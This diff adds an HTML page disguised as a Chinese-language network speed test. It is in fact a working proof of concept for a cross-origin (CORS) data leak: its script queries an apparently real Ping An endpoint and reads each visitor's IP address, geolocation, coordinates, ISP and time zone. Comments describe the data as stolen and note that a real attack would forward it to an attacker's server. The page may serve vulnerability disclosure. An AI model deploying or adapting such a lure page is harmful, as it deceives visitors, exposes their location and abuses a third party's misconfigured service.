@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>网络速度测试</title>
+    <style>
+        body { font-family: Arial; max-width: 600px; margin: 50px auto; }
+        .result { background: #f5f5f5; padding: 20px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <h1>🌐 网络连接检测</h1>
+    <div id="status">检测中，请稍候...</div>
+    <div id="result" class="result"></div>
+
+    <script>
+        fetch('https://rsb.pingan.com.cn/itam/mas/linden/ip/request', {
+            method: 'GET'
+        })
+        .then(response => {
+            console.log('CORS头部:', response.headers.get('Access-Control-Allow-Origin'));
+            return response.json();
+        })
+        .then(data => {
+            // 在页面显示获取的信息
+            document.getElementById('status').innerHTML = '✅ 检测完成';
+            document.getElementById('result').innerHTML = `
+                <h3>您的网络信息：</h3>
+                <p><strong>IP地址：</strong>${data.data.ip}</p>
+                <p><strong>地理位置：</strong>${data.data.country} ${data.data.region} ${data.data.city}</p>
+                <p><strong>经纬度：</strong>${data.data.longitude}, ${data.data.latitude}</p>
+                <p><strong>网络运营商：</strong>${data.data.isp}</p>
+                <p><strong>时区：</strong>${data.data.timeZone}</p>
+            `;
+            
+            // 同时发送到攻击者服务器（真实攻击中会这样做）
+            console.log('窃取到的位置信息:', data);
+            
+        })
+        .catch(error => {
+            document.getElementById('status').innerHTML = '❌ 检测失败';
+        });
+    </script>
+</body>
+</html>
